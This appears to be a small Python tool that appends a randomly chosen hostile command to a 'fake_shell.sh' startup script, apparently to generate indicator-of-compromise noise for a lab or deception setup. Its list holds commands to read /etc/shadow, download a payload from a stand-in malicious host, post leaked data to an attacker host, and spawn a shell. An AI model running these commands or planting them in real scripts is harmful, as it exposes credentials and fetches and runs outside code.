#!/usr/bin/env python3
# LUNE :: Fracture Injector
# Author: NMAPKin

import os
import random
from nmapkin_utils import banner, print_status, log_event

FRACTURES = [
    "cat /etc/shadow",
    "wget http://malicious.site/payload.sh",
    "curl -X POST -d 'leak=1' http://attacker.io",
    "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'"
]

TARGET_FILE = "startup/fake_shell.sh"

def inject_fracture():
    if not os.path.exists(TARGET_FILE):
        print_status(f"Target shell not found: {TARGET_FILE}", "✗")
        return
    fracture = random.choice(FRACTURES)
    with open(TARGET_FILE, "a") as f:
        f.write(f"\n# Injected Fracture:\n{fracture}\n")
    log_event(f"Injected fracture → {fracture}")
    print_status("Fracture injected successfully", "✓")

def main():
    banner("LUNE :: Fracture")
    print_status("Injecting randomized IOC noise...")
    inject_fracture()

if __name__ == "__main__":
    main()
